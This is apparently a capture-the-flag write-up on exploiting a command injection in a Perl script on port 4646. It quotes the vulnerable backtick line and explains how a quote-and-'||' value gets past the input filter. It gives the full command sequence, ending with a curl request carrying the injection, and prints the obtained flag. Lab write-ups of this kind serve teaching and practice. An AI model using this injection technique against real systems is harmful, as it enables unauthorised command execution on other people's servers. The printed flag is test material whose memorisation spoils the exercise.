In this perl script running on port 4646, the script sanitize the 'x' argument by removing all characters after a space, convert all the string to lowercase and remove some character like ';'. But we can execute /tmp/xd if we inject the right parameters in this line :
@output = `egrep "^$xx" /tmp/xd 2>&1`;
In fact, we can terminate the string with a double quote at the beginning and the end of our argument, use '||' to create another process and create a variable to put "" in a variable to start the script since we add a double quote at the end, av[0] will be "" in our new process. Let's inject our command:

echo "getflag>/tmp/res" > /tmp/xd
chmod 777 /tmp/xd
curl 'http://x.x.x.x:4646/?x="||var="'
cat /tmp/res

We get the flag 'g1qKMiRpXf53AWhDaU7FEkczr'.
